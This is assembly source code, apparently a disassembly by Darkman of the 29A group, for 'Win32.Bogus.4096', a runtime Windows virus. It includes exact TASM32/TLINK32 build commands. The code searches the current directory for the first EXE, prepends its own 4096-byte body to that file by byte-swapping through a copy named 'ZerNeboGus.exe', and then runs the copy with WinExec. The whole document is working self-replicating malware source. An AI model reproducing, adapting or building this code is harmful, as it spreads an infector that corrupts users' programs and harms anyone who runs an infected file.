comment *
                           Win32.Bogus.4096           млллллм млллллм млллллм
                             Disassembly by           ллл ллл ллл ллл ллл ллл
                              Darkman/29A              мммллп плллллл ллллллл
                                                      лллмммм ммммллл ллл ллл
                                                      ллллллл ллллллп ллл ллл

  Win32.Bogus.4096 is a 4096 bytes runtime/direct action EXE virus. Infects
  first file in current directory, when executed, by prepending the virus to
  the original EXE file.

  Compile Win32.Bogus.4096 with Turbo Assembler v 5.0 by typing:
    TASM32 /M /ML /Q BOGUS.ASM
    TLINK32 -Tpe -c -x -aa -r BOGUS.OBJ,,, IMPORT32
*

.386
.model flat
; KERNEL32.dll
        extrn   ExitProcess:proc
        extrn   FindFirstFileA:proc
        extrn   WinExec:proc
        extrn   _lclose:proc
        extrn   _llseek:proc
        extrn   _lopen:proc
        extrn   _lread:proc
        extrn   _lwrite:proc
        extrn   CopyFileA:proc

.data
MAX_PATH                equ     0ffh
FALSE                   equ     00h
OF_READWRITE            equ     02h     ; Opens the file for reading and
                                        ; writing
SW_SHOW                 equ     05h     ; Activates the window and displays it
                                        ; in its current size and position

FILETIME struct
  dwLowDateTime         DWORD   ?       ; Specifies the low-order 32 bits of
                                        ; the file time
  dwHighDateTime        DWORD   ?       ; Specifies the high-order 32 bits of
                                        ; the file time
FILETIME ends

WIN32_FIND_DATA struct
  dwFileAttributes      DWORD   ?       ; Specifies the file attributes of the
                                        ; file found
  ftCreationTime        FILETIME <>     ; Specifies the time the file was
                                        ; created
  ftLastAccessTime      FILETIME <>     ; Specifies the time that the file was
                                        ; last accessed
  ftLastWriteTime       FILETIME <>     ; Specifies the time that the file was
                                        ; last written to
  nFileSizeHigh         DWORD   ?       ; Specifies the high-order DWORD value
                                        ; of the file size, in bytes
  nFileSizeLow          DWORD   ?       ; Specifies the low-order DWORD value
                                        ; of the file size, in bytes
  dwReserved0           DWORD   ?       ; Reserved for future use
  dwReserved1           DWORD   ?       ; Reserved for future use
  cFileName             BYTE MAX_PATH dup(?)
                                        ; A null-terminated string that is the
                                        ; name of the file
  cAlternate            BYTE 0eh dup(?) ; A null-terminated string that is an
                                        ; alternative name for the file
ends

FindFileData    WIN32_FIND_DATA <>
szFileName      db      '*.exe',00h     ; Name of file to search for
szNewFileName   db      'ZerNeboGus.exe',00h
                                        ; Null-terminated string that
                                        ; specifies the name of the new file
cBuffer         db      ?               ; Buffer for read data, data to be
                                        ; written
cBuffer_        db      ?               ; Buffer for read data, data to be
                                        ; written

.code
code_begin:
        lea     edi,[esp+10h]           ; EDI = pointer to buffer for module
                                        ; path
        push    edi                     ; EDI = pointer to buffer for module
                                        ; path
        repne   scasb                   ; Find end of filename
        mov     byte ptr [edi-01h],'.'  ; Store dot
        pop     edi                     ; EDI = pointer to buffer for module
                                        ; path

        push    offset FindFileData     ; Address of returned information
        push    offset szFileName       ; Address of name of file to search
                                        ; for
        call    FindFirstFileA

        push    FALSE                   ; If file already exists, overwrite it
        push    offset szNewFileName    ; Address of filename to copy to
        push    edi                     ; Address of name of an existing file
        call    CopyFileA

        push    OF_READWRITE            ; Opens the file for reading and
                                        ; writing
        push    offset FindFileData.cFileName
                                        ; Address of name of file to open
        call    _lopen
        mov     esi,eax                 ; ESI = file handle

        push    OF_READWRITE            ; Opens the file for reading and
                                        ; writing
        push    offset szNewFileName    ; Address of filename to copy to
        call    _lopen
        mov     edi,eax                 ; EDI = file handle

        xor     ebx,ebx                 ; Number of bytes read and written
        mov     ebp,0fffff000h          ; Number of bytes to move through
                                        ; source file
read_write_loop:
        push    00h                     ; Position to move from
        push    ebx                     ; Number of bytes to move
        push    esi                     ; Pointer to destination filename
        call    _llseek

        push    01h                     ; Length, in bytes, of data buffer
        push    offset cBuffer          ; Address of buffer for read data
        push    esi                     ; Pointer to destination filename
        call    _lread

        push    00h                     ; Position to move from
        push    ebx                     ; Number of bytes to move
        push    edi                     ; Pointer to source filename
        call    _llseek

        push    01h                     ; Length, in bytes, of data buffer
        push    offset cBuffer_         ; Address of buffer for read data
        push    edi                     ; Pointer to source filename
        call    _lread

        push    00h                     ; Position to move from
        push    ebx                     ; Number of bytes to move
        push    esi                     ; Pointer to destination filename
        call    _llseek

        push    01h                     ; Number of bytes to write
        push    offset cBuffer_         ; Address of buffer for data to be
                                        ; written
        push    esi                     ; Pointer to destination filename
        call    _lwrite

        push    02h                     ; Position to move from
        push    00h                     ; Number of bytes to move
        push    esi                     ; Pointer to destination filename
        call    _llseek

        push    01h                     ; Number of bytes to write
        push    offset cBuffer          ; Address of buffer for data to be
                                        ; written
        push    esi                     ; Pointer to destination filename
        call    _lwrite

        push    02h                     ; Position to move from
        push    ebp                     ; Number of bytes to move
        push    edi                     ; Pointer to source filename
        call    _llseek

        push    01h                     ; Length, in bytes, of data buffer
        push    offset cBuffer          ; Address of buffer for read data
        push    edi                     ; Pointer to source filename
        call    _lread

        push    00h                     ; Position to move from
        push    ebx                     ; Number of bytes to move
        push    edi                     ; Pointer to source filename
        call    _llseek

        push    01h                     ; Number of bytes to write
        push    offset cBuffer          ; Address of buffer for data to be
        push    edi                     ; Pointer to source filename
        call    _lwrite

        inc     ebx                     ; Increase number of bytes read and
                                        ; written
        inc     ebp                     ; Increase number of bytes to move
                                        ; through source file
        cmp     bx,1000h                ; Read and written all of the virus?
        jne     read_write_loop         ; Not equal? Jump to read_write_loop

        push    edi                     ; Handle of file to close
        call    _lclose

        push    SW_SHOW                 ; Activates the window and displays it
                                        ; in its current size and position
        push    offset szNewFileName    ; Address of filename to copy to
        call    WinExec
code_end:

end          code_begin